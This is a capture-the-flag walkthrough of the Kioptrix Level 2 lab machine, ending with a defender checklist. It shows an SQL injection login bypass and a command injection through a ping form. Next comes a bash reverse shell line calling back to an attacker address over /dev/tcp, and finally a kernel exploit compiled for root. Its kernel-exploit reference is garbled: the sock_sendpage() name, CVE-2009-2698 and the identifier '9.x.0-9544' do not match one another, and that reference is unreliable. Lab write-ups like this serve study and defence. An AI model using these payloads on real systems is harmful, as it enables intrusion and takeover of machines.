---
title: "Kioptrix Level 2"
date: 2026-02-22
platform: VulnHub
difficulty: Easy
category: offensive
summary: "SQL injection auth bypass into a vulnerable ping form (command injection), then kernel privesc via the sock_sendpage() exploit."
---

## Overview

Kioptrix Level 2 (the second in the classic Kioptrix VulnHub series) is an easy box that teaches three patterns at once: **SQL injection authentication bypass**, **command injection in a backend form**, and a **kernel exploit privesc**.

It's an old box, so the techniques look textbook. That's exactly what makes it a great learning environment: the bugs are simple enough to inspect line by line.

## Tools Used

- **nmap** for the port scan.
- **A browser** for the SQLi auth bypass.
- **netcat** for the reverse shell.
- **gcc** for compiling the kernel exploit.
- **uname** and **searchsploit** for kernel-version exploit matching.

## Methodology

**Step 1 - Service enumeration.** A nmap scan returns SSH on 22, HTTP and HTTPS on 80/443, with an Apache login page on port 80.

```bash
nmap -p- -sV <TARGET_IP>
```

**Step 2 - SQLi authentication bypass.** The login form takes a username and password. The classic SQLi payload below makes the WHERE clause always return true.

```
Username: admin' OR '1'='1
Password: admin' OR '1'='1
```

The resulting SQL looks like:

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'admin' OR '1'='1'
```

The `'1'='1'` clause is always true, so the database returns rows and the app considers the user authenticated. This is the textbook **CWE-89: SQL Injection**.

**Step 3 - Find the command injection.** The post-login page has a *ping* form: enter an IP, the page pings it from the server and shows output. The form passes the user input directly to the shell.

```
127.0.0.1; id
```

The semicolon ends the *ping 127.0.0.1* command and starts a new one (*id*). The page shows the output of both, confirming command execution as the web user.

**Step 4 - Reverse shell.** Replace `id` with a bash reverse shell.

```bash
# attacker:
nc -lvnp 4444
```

```
127.0.0.1; bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1
```

A reverse shell lands.

**Step 5 - Local enumeration.**

```bash
uname -a
```

The kernel version comes back as something old (2.6.9 era). That kernel range is vulnerable to a well-known privilege escalation called **sock_sendpage()** (CVE-2009-2698 / 9.x.0-9544), which lets a local user trigger a NULL pointer dereference in the kernel and gain root.

**Step 6 - Compile and run the kernel exploit.**

```bash
# on the target, after wget'ing the exploit:
gcc 9542.c -o exploit
./exploit
```

The exploit triggers the kernel bug and drops a root shell.

## Key Takeaways

- **SQLi auth bypass is the easiest CTF lesson and the hardest real-world lesson.** Real-world SQL injection is almost always blind these days, but the underlying logic (input concatenated into a query) is the same.
- **Command injection in a "ping" or "lookup" form is a beginner classic.** Any form that takes user input and shells out without sanitization has this bug.
- **Kernel exploits are noisy but reliable when they apply.** Always check `uname -a` and pipe the output to a kernel-version-to-exploit lookup tool.
- **Old kernels are a one-shot privesc.** The room runs Linux 2.6.x; modern environments should be on 5.x or 6.x. Old kernels equal compromised hosts.

## What a Defender Should Do

- **Parameterize every database query.** Prepared statements with parameter binding (PDO in PHP, `?` placeholders in most ORMs) make SQL injection impossible by construction. There is no good reason to concatenate user input into a SQL string in 2024+.
- Sanitize and *validate* any user input that touches a shell call. If a form takes an IP for ping, parse it as an IP and refuse anything that isn't one. Better: don't shell out at all; use a library or system call (`socket.connect` for TCP reachability, ICMP raw socket for ping).
- Patch the kernel. There is no excuse to be running a 2.6.x kernel in production in 2024+. Distribution backports cover years of CVEs in a single update.
- Monitor `/var/log/auth.log` and `auditd` for unexpected exec calls from the web server's user. A PHP-fpm process spawning bash is high-confidence malicious.
